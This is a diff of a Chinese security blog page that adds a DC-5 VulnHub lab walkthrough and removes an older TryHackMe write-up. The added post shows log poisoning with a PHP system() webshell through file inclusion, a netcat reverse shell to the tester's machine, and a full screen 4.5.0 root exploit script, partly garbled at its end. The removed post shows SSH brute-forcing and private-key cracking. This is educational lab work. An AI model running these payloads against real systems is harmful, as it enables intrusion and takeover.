@@ -152,6 +152,184 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-DC5靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/19/DC5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">DC5靶机渗透记录</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/19/DC5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2021-02-18T19:40:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <center>DC-5渗透记录</center>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老姿势了，信息收集三板斧<code>netdiscover</code>，<code>nmap</code>和<code>dirsearch</code>。（因为靶机和测试机都在同一个局域网内所以我用了netdiscover来代替）</p>
+<p><img src="/images/image-20210218154622630.png" alt="image-20210218154622630"></p>
+<p>靶机ip<code>192.168.1.12</code>，测试机ip<code>192.168.1.11</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.12 -p 1-10000</span><br></pre></td></tr></table></figure>
+<p>nmap扫描，因为怕出现上次的端口迁移，这里我扫了前一万个端口</p>
+<p><img src="/images/image-20210218154932767.png" alt="image-20210218154932767"></p>
+<p>发现不光开放了80端口，还有一个111的端口也开放了，先记下来以备后用。浏览一下对应的web端，在祭出<code>dirsearch</code>扫描一波。</p>
+<p><img src="/images/image-20210218155640012.png" alt="image-20210218155640012"></p>
+<p>嗯，光看扫描结果有点惨淡。</p>
+<h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><p>web端是nginx的中间件，php语言，在Contact处有一个交互页面，可以提交内容，估计这里就是可利用点</p>
+<p>随手交了一个内容，get传参，上方网址变为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.12/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E</span><br></pre></td></tr></table></figure>
+<p>多次刷新<code>thankyou.php</code>页面发现了一个小细节XD。页面最下面的<code>Copyright@2017</code>的年份会变化。来来来我们研究一下这个页面。</p>
+<p>网站是php写的，但是我们没有扫出来thankyou.php，所以要换一个扫描，这里使用了dirb工具，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44912169/article/details/105655195">我是链接</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.12/ /usr/share/wordlists/dirb/big.txt -X .php -S</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210218165858238.png" alt="image-20210218165858238"></p>
+<p><code>/footer.php</code>会变动，推测是文件包含漏洞，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Excellent-person/articles/12324451.html">我是链接</a></p>
+<blockquote>
+<p>严格来说，文件包含漏洞是“代码注入”的一种。在“注入攻击”一章中，曾经提到过“代码注入”这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行。“代码注入”的典型代表就是文件包含（File Inclusion）。文件包含可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下。</p>
+<p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), …</p>
+<p>JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), …</p>
+<p>ASP：include file, include virtual, …</p>
+<p>在互联网的安全历史中，PHP的文件包含漏洞已经臭名昭著了，因为黑客们在各种各样的PHP应用中挖出了数不胜数的文件包含漏洞，且后果都非常严重。</p>
+<p>文件包含是PHP的一种常见用法，主要由4个函数完成：</p>
+<p>include()</p>
+<p>require()</p>
+<p>include_once()</p>
+<p>require_once()</p>
+<p>当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。这一特性，在实施攻击时将非常有用。比如以下代码：</p>
+<?php
+
+include($_GET[test]);
+
+?>
+
+<p>要想成功利用文件包含漏洞，需要满足下面两个条件：</p>
+<p>（1）include()等函数通过动态变量的方式引入需要包含的文件；</p>
+<p>（2）用户能够控制该动态变量。</p>
+</blockquote>
+<p>先确定该传参变量名，可以考虑使用burp爆破变量名，我们首先确定了index.php的存在，所以构造</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/thankyou.php?§A§=index.php</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210218183336907.png" alt="image-20210218183336907"></p>
+<p>可知动态变量名为file。然后就用该变量访问敏感信息。</p>
+<p><img src="/images/image-20210218180910850.png" alt="image-20210218180910850"></p>
+<p>有了！考虑该服务器没有登录框，也没开放ssh端口，这种情况下要让我们获得shell有两种想法</p>
+<ol>
+<li>写入一句话木马，webshell工具链接</li>
+<li>写入nc回弹shell</li>
+</ol>
+<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>由nmap结果我们可知，nginx的中间件会有<code>access.log</code>这个文件来记录访问信息，同时会有<code>error.log</code>这个文件来记录错误信息。这里构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=<span class="meta">&lt;?php</span> system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="meta">?&gt;</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+<p>再通过<code>GET /thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</code>查看回显来看我们是否利用了该文件包含漏洞。回显如下</p>
+<p><img src="/images/image-20210219020426257.png" alt="image-20210219020426257"></p>
+<p>发现有回显！说明我们调用的cmd参数可以作为命令来远程执行，接下来可以直接传递nc命令来反弹shell。我也试过连接webshell工具。但是不知道为什么，蚁剑和冰蝎都无法连接上去QAQ，太奇怪了。</p>
+<blockquote>
+<p>访问日志主要记录客户端的请求。客户端向Nginx服务器发起的每一次请求都记录在这里。客户端IP，浏览器信息，referer，请求处理时间，请求URL等都可以在访问日志中得到。</p>
+</blockquote>
+<p><img src="/images/image-20210218184736084.png" alt="image-20210218184736084"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /thankyou.php?file=/<span class="keyword">var</span>/log/nginx/<span class="built_in">error</span>.log&amp;cmd=nc -e /bin/sh <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>  <span class="number">5200</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+<p>使用如上命令来nc反弹shell，当然，测试机上要先</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 5200</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210219021506496.png" alt="image-20210219021506496"></p>
+<p>如此以来，我们成功得到shell！</p>
+<p>换成交互式<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p>GET！XD</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先码一个超强的提权总和 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/261271.html">我是链接</a></p>
+<p>然后就是常规的提权操作啦，先查询s权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/images/image-20210219021839831.png" alt="image-20210219021839831"></p>
+<p>这里参考了一下eson的wp，发现<code>exim4</code>有一个46996.sh的提权脚本可利用，思路先往这里放一放XD</p>
+<p>首先发现exim的版本<code>exim4 --version</code></p>
+<p><img src="/images/image-20210219022621406.png" alt="image-20210219022621406"></p>
+<p>分析了一下46996.sh的版本，发现不是很匹配，，，所以换了上文链接中的screen提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210219024005904.png" alt="image-20210219024005904"></p>
+<p>这里注意一下，msf的提权脚本路径<code>/usr/share/exploitdb/exploits</code>后加上不同的路径</p>
+<p>这里我们打开了41154.sh文件，发现它的运行方式有点东西</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> screenroot.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> setuid screen v4.5.0 <span class="built_in">local</span> root exploit</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HACK THE PLANET</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ~ infodox (25/1/2017)</span> </span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">这里开始，一</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">这里结束，一</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c#命令行输入此命令生成libhax.so文件</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line"><span class="meta">#</span><span class="bash">这里开始，二</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">这里结束，二</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c#同命令行输入</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshellrocat &lt;&lt; EOF &gt; /tmp/libhax.c /tmp/libhax.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+<p>就是说要本地分两部分gcc编译，编译完的文件在上传到靶机。</p>
+<p>上传使用nc传文件，方便且不用Python部署服务器啦，ftp传递啦之类的</p>
+<p>kali：</p>
+<ul>
+<li><code>nc -lnvp 1234 &lt; libhax.so</code> 使用<code>Ctrl+C</code>就可以打断靶机的接收并不影响shell</li>
+<li><code>nc -lnvp 1234 &lt; rootshell</code></li>
+</ul>
+<p>靶机</p>
+<ul>
+<li><code>nc 192.168.1.11 1234 &gt; libhax.so</code></li>
+<li><code>nc 192.168.1.11 1234 &gt; rootshell</code></li>
+</ul>
+<p><strong>注意，这里的操作尽量都在两台机器的/tmp文件夹里进行，因为该文件夹下权限较大</strong></p>
+<p>然后再靶机上一次执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br></pre></td></tr></table></figure>
+<p>如上命令，最后切换回/tmp文件，执行rootshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">./rootshell</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210219032958095.png" alt="image-20210219032958095"></p>
+<p>OK！获得最高权限！（研究这个提权脚本浪费了我太长太长时间了XD）</p>
+<p><img src="/images/image-20210219033138120.png" alt="image-20210219033138120"></p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>很有收获！学会了文件包含漏洞，以及一些提权方式。（终于摆脱了一次爆破密码这种玄学渗透一次XD）</p>
+<p>但是也有点奇怪？为什么我的webshell工具无法连接？？？结果浪费了好长好长时间。</p>
+<p>嘛，暂时就这样吧，毕竟确实学到了一点东西XD</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/19/DC5%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DC4靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -243,7 +421,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">vulhub</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
         		</li>
       		
 		</ul>
@@ -415,7 +593,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">vulhub</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
         		</li>
       		
 		</ul>
@@ -1085,7 +1263,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">vulhub</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
         		</li>
       		
 		</ul>
@@ -1347,139 +1525,6 @@
 
 
   
-    <article id="post-THM-room-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/20/THM-room-1/">THM-room-1</a>
-    </h1>
-  
-
-        
-        <a href="/2021/01/20/THM-room-1/" class="archive-article-date">
-  	<time datetime="2021-01-20T12:54:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <center>Try Hack Me(一)</center>
-
-<p>[toc]</p>
-<h1 id="Basic-Pentesting-Room"><a href="#Basic-Pentesting-Room" class="headerlink" title="Basic Pentesting Room"></a>Basic Pentesting Room</h1><h2 id="部署靶机"><a href="#部署靶机" class="headerlink" title="部署靶机"></a>部署靶机</h2><p>首先openvpn在kali机子上部署，命令行为</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn /path/xxx.opvn</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210119004603588.png" alt="image-20210119004603588"></p>
-<p>部署成功如上图。</p>
-<h2 id="隐藏页面扫描"><a href="#隐藏页面扫描" class="headerlink" title="隐藏页面扫描"></a>隐藏页面扫描</h2><p>部署成功后前两问显然攻破，接下来第三问询问该web的隐藏页面，老规矩先收集信息，nmap一波</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV 10.10.44.68 &gt; thmroom1.txt</span><br><span class="line">//该命令将10.10.44.68页面端口部署机器版本号及相关信息扫描完成后存入thmroom1.txt文件中方便后续查看</span><br></pre></td></tr></table></figure>
-<p>扫描结果如下图：<img src="/images/image-20210119005930815.png" alt="image-20210119005930815"></p>
-<p>接下来经典dirsearch目录扫描：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.44.68/ -e*</span><br><span class="line">//确保进入了dirsearch的文件夹中，用python3使用，且最后一个-e*命令表示扫描的页面为全部格式</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210119010210381.png" alt="image-20210119010210381"></p>
-<p>结果如上</p>
-<h2 id="强行查找用户密码"><a href="#强行查找用户密码" class="headerlink" title="强行查找用户密码"></a>强行查找用户密码</h2><p>第四问很离谱，没太搞懂，在网页端突然就要找用户密码什么的？QWQ</p>
-<p>反正先登录/develop目录康康，发现有两个.txt文件，保存了两个人的对话，复制下来放Deepl里翻译康康（原谅本人渣渣英语水平QAQ）得到一点信息应该是打入靶机后找/etc/shadow目录，里面有薄弱环节。</p>
-<p><img src="/images/image-20210119011006814.png" alt="image-20210119011006814"></p>
-<p>此时回过头来查看刚才nmap扫描结果发现对方开启了22端口ssh登录，猜测可能是要我们暴力枚举，考虑了hydra，但在不知道user的情况下爆破极为困难。</p>
-<p>参考了一款工具**<em>enum4linux**</em></p>
-<p>这里参考使用连接**<a target="_blank" rel="noopener" href="https://www.ctolib.com/topics-82798.html">我是连接</a>**</p>
-<p>kali上调出来enum4linux使用方法<code>./enum4linux.pl [options] ip</code>(但不知道到它绝对路径所以换了种输入)</p>
-<p>集合成命令行：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 10.10.44.68 | tee enum4linux.log//-a适合在什么都不知道的情况下使用</span><br></pre></td></tr></table></figure>
-<p>经过了漫长漫长的扫描等待环节，还有两次openvpn连接炸掉的事故后，终于扫出来了两人的名儿QAQ</p>
-<blockquote>
-<p>妈妈我有钱了一定要换台牛逼的电脑玩渗透QAQ ！——记开Chrome和VMware内存占用92%</p>
-</blockquote>
-<p><img src="/images/image-20210119021723486.png" alt="image-20210119021723486"></p>
-<p>如图显然用户名为kay&amp;jan</p>
-<p>同时下题还有询问连接什么访问服务器，SSH哇！takedown   :)</p>
-<h2 id="爆破服务器ssh"><a href="#爆破服务器ssh" class="headerlink" title="爆破服务器ssh"></a>爆破服务器ssh</h2><p>得到user后祭出hydra傻瓜神器爆破（我爆我自己？）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.89.207 </span><br><span class="line">//因为是默认22端口所以无需修改ssh爆破端口，同时这里使用了kali自带字典rockyou.txt，也可自己去github上嫖些密码字典</span><br></pre></td></tr></table></figure>
-<p>kali自带字典：</p>
-<p><img src="/images/image-20210119023439525.png" alt="image-20210119023439525"></p>
-<p>爆破开始，好家伙这所需时间把我吓哭了</p>
-<p><img src="/images/image-20210119024020600.png" alt="image-20210119024020600"></p>
-<p>但是也就一小会儿，哇！（黑人欢呼.jpg）</p>
-<p><img src="/images/image-20210119024349482.png" alt="image-20210119024349482"></p>
-<p>废话少说，ssh登录注入提权一条龙</p>
-<h2 id="打入服务器"><a href="#打入服务器" class="headerlink" title="打入服务器"></a>打入服务器</h2><p>连接上之后常规试探权限，注意到之前提到的/etc/shadow目录是个伏笔，测试了一圈全部permission denied。</p>
-<p>显然接下来传提权马，github上嫖了一个linux的本地提权脚本，接下来传上去</p>
-<p><img src="/images/image-20210119031632107.png" alt="image-20210119031632107"></p>
-<p>欧克马已上传</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp linpeas.sh jan@10.10.89.207:dev/shm</span><br></pre></td></tr></table></figure>
-<p>进入传输的文件夹后记得chmod增加权限</p>
-<p><img src="/images/image-20210119031934030.png" alt="image-20210119031934030"></p>
-<p>我执行这个命令后报了错，，，不知道为什么，手动寻找使用<code>ls -al</code>命令查看所有文件夹的权限，发现了kay用户有一个<code>ssh</code>文件夹，可读，于是果断复制粘贴到kali上，接下来使用一款工具<code>JohnTheRipper</code>进行ssh破解。首先：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> locate ssh2john.py</span></span><br><span class="line">/root/Ripper/JohnTheRipper/run/ssh2john.py</span><br><span class="line">/usr/share/john/ssh2john.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> python /root/Ripper/JohnTheRipper/run/ssh2john.py room1_id_rsa &gt; answer.txt</span></span><br><span class="line">//其中room1_id_rsa是我们复制下来的秘钥文件，接下来运行这个python工具将其转化为hash值</span><br><span class="line"><span class="meta">#</span><span class="bash"> john answer.txt --wordlist=/usr/share/wordlists/rockyou.txt</span></span><br></pre></td></tr></table></figure>
-<p>注意此时可能会报<code>Crash recovery file is locked: /root/.john/john.rec</code>这个错误，只需在root权限下删除该文件即可</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /root/.john/john.rec</span><br><span class="line">john answer.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-<p>此hash crack结果如下图:</p>
-<p><img src="/images/image-20210124145255737.png" alt="image-20210124145255737"></p>
-<h2 id="登录kay用户"><a href="#登录kay用户" class="headerlink" title="登录kay用户"></a>登录kay用户</h2><p>哈希碰撞出的密码接下来就用秘钥登录吧，<strong>千万要注意提前给秘钥文件提权限<code>chmod 600 room1_id_rsa</code></strong> </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i room1_id_rsa kay@10.10.89.207</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210124150834954.png" alt="image-20210124150834954"></p>
-<p><code>ls -al</code>查看pass.bak文件权限发现-rw，直接cat打开得到最终密码</p>
-<p><img src="/images/image-20210124151238789.png" alt="image-20210124151238789"></p>
-<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>结束通关，整个过程很锻炼基础操作和知识，其中也碰到了一些问题，要自己分析解决，挺锻炼的。</p>
-<p>哦哦哦还有一个小彩蛋哇！提权为root用户后直接<code>cd</code>可以发现一个<code>flag.txt</code>文件（CTF选手DNA动了QWQ）</p>
-<p><img src="/images/image-20210124152324974.png" alt="image-20210124152324974"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Try hack me</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/20/THM-room-1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1598,10 +1643,6 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vulhub</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
@@ -1627,6 +1668,10 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">杂类</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">vulnhub</a>
               </li>
             
             <div class="clearfix"></div>
